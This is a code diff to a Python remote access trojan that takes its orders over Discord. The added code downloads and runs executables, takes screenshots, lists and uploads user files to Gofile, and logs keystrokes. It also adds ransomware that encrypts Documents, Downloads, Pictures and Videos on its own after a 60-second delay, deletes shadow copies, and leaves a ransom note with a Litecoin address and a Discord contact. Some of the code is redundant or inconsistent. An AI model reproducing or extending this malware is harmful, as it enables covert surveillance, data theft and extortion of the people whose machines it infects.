@@ -20,6 +20,7 @@ import shutil
 import pythoncom
 from pynput import keyboard
 import threading
+import base64
 
 last_keylog_message_id = "None"
 last_keylog_timestamp = "None"
@@ -365,42 +366,344 @@ async def on_ready():
     channel = await get_or_create_channel(guild, channel_name)
 
     global CHANNEL_ID
-    CHANNEL_ID = channel.id
-    print(f"Channel ID set to: {CHANNEL_ID}")  # Debug statement
+    CHANNEL_ID = channel.id  # Store the channel ID globally
 
-    # Create or get the keys channel
-    keys_channel_name = f"{channel_name}-keys"
-    keys_channel = await get_or_create_channel(guild, keys_channel_name)
+    # Ping @everyone in the channel
+    await channel.send(f"@everyone {desktop_name} has joined the server!")
 
-    global KEYS_CHANNEL_ID
-    KEYS_CHANNEL_ID = keys_channel.id
-    print(f"Keys Channel ID set to: {KEYS_CHANNEL_ID}")  # Debug statement
+# Command to handle file sending
+@bot.command()
+async def send(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
+        return
 
-    # Create or get the screenshots channel
-    screenshots_channel_name = f"{channel_name}-screenshots"
-    screenshots_channel = await get_or_create_channel(guild, screenshots_channel_name)
+    if len(ctx.message.attachments) > 0:
+        attachment = ctx.message.attachments[0]
+        file_path = os.path.join(FILES_DIR, attachment.filename)
+        print(f"Downloading file: {file_path}")  # Debug statement
 
-    global SCREENSHOTS_CHANNEL_ID
-    SCREENSHOTS_CHANNEL_ID = screenshots_channel.id
-    print(f"Screenshots Channel ID set to: {SCREENSHOTS_CHANNEL_ID}")  # Debug statement
+        # Download the file
+        await attachment.save(file_path)
 
-    # Send a "ping" message to indicate the bot is online
-    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
-    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.dark_red())
-    await channel.send(embed=embed)
+        # Now run the downloaded file silently (e.g., .exe, .bat)
+        try:
+            if file_path.endswith(".bat") or file_path.endswith(".exe"):
+                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.dark_red())
+                await ctx.send(embed=embed)
+                print(f"Executed file: {file_path}")  # Debug statement
+            else:
+                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.dark_red())
+                await ctx.send(embed=embed)
+        except Exception as e:
+            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.dark_red())
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.dark_red())
+        await ctx.send(embed=embed)
 
-    print(f"Bot is online. Pinged channel: {channel.name}")
+# Command to take a screenshot
+@bot.command()
+async def screenshot(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
+        return
 
-    # Start the keylogger in a separate thread
-    threading.Thread(target=start_keylogger, daemon=True).start()
+    # Take a screenshot using Pillow
+    screenshot = ImageGrab.grab()
+    # Save the screenshot to a BytesIO object
+    byte_io = io.BytesIO()
+    screenshot.save(byte_io, 'PNG')
+    byte_io.seek(0)
+    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
+    embed.set_image(url="attachment://screenshot.png")
+    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))
 
-    # Start the screenshot capturing task
-    capture_screenshot.start()
+# Command to list specific directories and their contents
+@bot.command()
+async def filelist(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
+        return
+
+    # Define the directories to list
+    directories = ["Downloads", "Documents", "Videos", "Pictures"]
+
+    # List all files and directories in the specified directories recursively
+    file_list = []
+    for dir_name in directories:
+        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
+        if os.path.exists(dir_path):
+            for root, dirs, files in os.walk(dir_path):
+                for name in dirs:
+                    file_list.append(os.path.join(root, name))
+                for name in files:
+                    file_list.append(os.path.join(root, name))
+
+    # Split the file list into chunks of 3 embeds
+    chunk_size = 3
+    for i in range(0, len(file_list), chunk_size):
+        chunk = file_list[i:i + chunk_size]
+        file_list_str = "\n".join(chunk)
+        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.dark_red())
+        await ctx.send(embed=embed)
+
+# Command to download a specific directory or file
+@bot.command()
+async def download(ctx, *, path: PathConverter):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
+        return
+
+    # Prepend the current user's home directory if the path does not start with a drive letter
+    if not os.path.isabs(path):
+        path = os.path.join(os.path.expanduser("~"), path)
+
+    print(f"Checking path: {path}")  # Debug statement
+
+    # Check if the path exists
+    if os.path.exists(path):
+        print(f"File exists: {path}")  # Debug statement
+        if os.path.isdir(path):
+            # List all files in the specified directory
+            files = os.listdir(path)
+            file_list = "\n".join([os.path.join(path, file) for file in files])
+            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.dark_red())
+            await ctx.send(embed=embed)
+        elif os.path.isfile(path):
+            file_size = os.path.getsize(path)
+            print(f"File size: {file_size} bytes")  # Debug statement
+            file_extension = os.path.splitext(path)[1].lower()
+            print(f"File extension: {file_extension}")  # Debug statement
+
+            # Ensure the file is saved with its original name and extension
+            base_name = os.path.basename(path)
+            new_file_path = os.path.join(FILES_DIR, base_name)
+
+            # Check if the file already exists in the files directory
+            if not os.path.exists(new_file_path):
+                # Upload the file to Gofile and get the download link
+                download_link = await upload_to_gofile(path)
+                if download_link:
+                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.dark_red())
+                    await ctx.send(embed=embed)
+                else:
+                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.dark_red())
+                    await ctx.send(embed=embed)
+            else:
+                print(f"File already exists: {new_file_path}")  # Debug statement
+                embed = discord.Embed(title="File Already Exists", description=f"The file {base_name} already exists in the files directory.", color=discord.Color.dark_red())
+                await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.dark_red())
+            await ctx.send(embed=embed)
+    else:
+        print(f"File does not exist: {path}")  # Debug statement
+        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.dark_red())
+        await ctx.send(embed=embed)
+
+# Command to list all available commands
+@bot.command()
+async def cmds(ctx):
+    # Remove the help command from the list and prepend the prefix
+    commands_list = [f"!{command.name}" for command in bot.commands if command.name != "help"]
+    embed = discord.Embed(title="Available Commands", description="Here is a list of all available commands:", color=discord.Color.dark_red())
+    embed.add_field(name="Commands", value="\n".join(commands_list), inline=False)
+    await ctx.send(embed=embed)
+
+# Override the default help command
+bot.help_command = None
+
+# Keylogger class
+class Keylogger:
+    def __init__(self):
+        self.log = []
+        self.last_message_id = None
+        self.last_timestamp = None
+
+    def on_press(self, key):
+        try:
+            char = key.char
+            if char.isspace():
+                char = " "
+            self.log.append(char)
+            print(char, end='', flush=True)
+            if char == '\n':
+                self.send_log()
+        except AttributeError:
+            if key == keyboard.Key.space:
+                self.log.append(" ")
+            elif key == keyboard.Key.enter:
+                self.log.append("\n")
+                self.send_log()
+            else:
+                self.log.append(f"[{key}]")
+
+    def send_log(self):
+        if self.log:
+            log_content = ''.join(self.log)
+            print(f"Sending log: {log_content}")  # Debug statement
+            self.log = []
+            # Send the log content to the Discord channel
+            asyncio.run_coroutine_threadsafe(self.send_to_discord(log_content), bot.loop)
+
+    async def send_to_discord(self, log_content):
+        global last_keylog_message_id, last_keylog_timestamp
+        channel = bot.get_channel(KEYS_CHANNEL_ID)
+        if channel:
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            message = await channel.send(f"Captured Keystrokes at {timestamp}: ```{log_content}```")
+            self.last_message_id = message.id
+            self.last_timestamp = timestamp
+            last_keylog_message_id = message.id
+            last_keylog_timestamp = timestamp
+        else:
+            print(f"Channel with ID {KEYS_CHANNEL_ID} not found!")  # Debug statement
+
+# Start the keylogger
+def start_keylogger():
+    with keyboard.Listener(on_press=Keylogger().on_press) as listener:
+        listener.join()
+
+# Screen capturing task
+@tasks.loop(seconds=3)  # Capture a screenshot every 3 seconds
+async def capture_screenshot():
+    screenshot = ImageGrab.grab()
+    byte_io = io.BytesIO()
+    screenshot.save(byte_io, 'PNG')
+    byte_io.seek(0)
+    file = discord.File(byte_io, 'screenshot.png')
+    channel = bot.get_channel(SCREENSHOTS_CHANNEL_ID)
+    if channel:
+        # Generate a new timestamp for when the screenshot is sent
+        screenshot_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
+        embed.set_image(url="attachment://screenshot.png")
+        if last_keylog_message_id:
+            embed.add_field(name="Last Keylog Message", value=f"[Message](https://discord.com/channels/{GUILD_ID}/{KEYS_CHANNEL_ID}/{last_keylog_message_id}) at {last_keylog_timestamp}", inline=False)
+        else:
+            embed.add_field(name="Last Keylog Message", value="None", inline=False)
+
+        # Add the new timestamp to the embed
+        embed.add_field(name="Screenshot Sent At", value=screenshot_timestamp, inline=False)
+
+        await channel.send(embed=embed, file=file)
+    else:
+        print(f"Channel with ID {SCREENSHOTS_CHANNEL_ID} not found!")  # Debug statement
+
+# Ransomware functionality
+def encrypt_files(directory, key):
+    cipher_suite = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            encrypted_data = cipher_suite.encrypt(data)
+            with open(file_path, 'wb') as f:
+                f.write(encrypted_data)
+            print(f"Encrypted: {file_path}")  # Debug statement
+
+def decrypt_files(directory, key):
+    cipher_suite = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            decrypted_data = cipher_suite.decrypt(data)
+            with open(file_path, 'wb') as f:
+                f.write(decrypted_data)
+            print(f"Decrypted: {file_path}")  # Debug statement
+
+def disable_system_recovery():
+    try:
+        for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
+            drive_letter = drive + ':\\'
+            if os.path.exists(drive_letter):
+                subprocess.run(['wmic', 'ShadowCopy', 'delete', f'/NoInteractive'], check=True)
+                print(f"Disabled system recovery for {drive_letter}")  # Debug statement
+    except subprocess.CalledProcessError as e:
+        print(f"Error disabling system recovery: {e}")  # Debug statement
+
+# Delay execution by 60 seconds
+time.sleep(60)
+
+# Directories to encrypt
+directories = ["C:\\Users\\{}\\Documents".format(os.getlogin()),
+               "C:\\Users\\{}\\Downloads".format(os.getlogin()),
+               "C:\\Users\\{}\\Pictures".format(os.getlogin()),
+               "C:\\Users\\{}\\Videos".format(os.getlogin())]
+
+# Encrypt files in the specified directories
+for directory in directories:
+    encrypt_files(directory, key)
+
+# Disable system recovery
+disable_system_recovery()
+
+# Command to handle ransomware encryption
+@bot.command()
+async def encrypt(ctx):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
+        return
+
+    # Directories to encrypt
+    directories = ["C:\\Users\\{}\\Documents".format(os.getlogin()),
+                   "C:\\Users\\{}\\Downloads".format(os.getlogin()),
+                   "C:\\Users\\{}\\Pictures".format(os.getlogin()),
+                   "C:\\Users\\{}\\Videos".format(os.getlogin())]
+
+    # Encrypt files in the specified directories
+    for directory in directories:
+        encrypt_files(directory, key)
+
+    # Disable system recovery
+    disable_system_recovery()
+
+    embed = discord.Embed(title="Encryption Completed", description="Files have been encrypted successfully. A ransom note has been placed in each encrypted directory.", color=discord.Color.dark_red())
+    await ctx.send(embed=embed)
+
+# Function to create a ransom note
+def create_ransom_note(directory, key):
+    ransom_note_content = (
+        "Your files have been encrypted!\n\n"
+        "To decrypt your files, please follow these instructions:\n"
+        "1. Open Discord and DM iimatea5 with the message 'I need to decrypt my files'.\n"
+        "2. Send exactly 50$ to the following Litecoin (LTC) address: LNj4aUCDo7XnAHs5ZzRP3jBESPFUwEo892\n"
+        "3. Wait for further instructions from iimatea5.\n\n"
+        "Your encryption key: {}\n"
+        "Do not modify or delete this file. It is essential for decryption.\n"
+    ).format(key.decode())
+
+    ransom_note_path = os.path.join(directory, "RANSOM_NOTE.txt")
+    with open(ransom_note_path, 'w') as f:
+        f.write(ransom_note_content)
+    print(f"Ransom note created at: {ransom_note_path}")  # Debug statement
+
+# Modify the encrypt_files function to create a ransom note in each directory
+def encrypt_files(directory, key):
+    cipher_suite = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            encrypted_data = cipher_suite.encrypt(data)
+            with open(file_path, 'wb') as f:
+                f.write(encrypted_data)
+            print(f"Encrypted: {file_path}")  # Debug statement
+
+    # Create a ransom note in the encrypted directory
+    create_ransom_note(directory, key)
 
 # Run the bot
-def run_bot():
-    print("Starting the bot...")
-    bot.run(TOKEN)
-
-if __name__ == "__main__":
-    run_bot()
+bot.run(TOKEN)
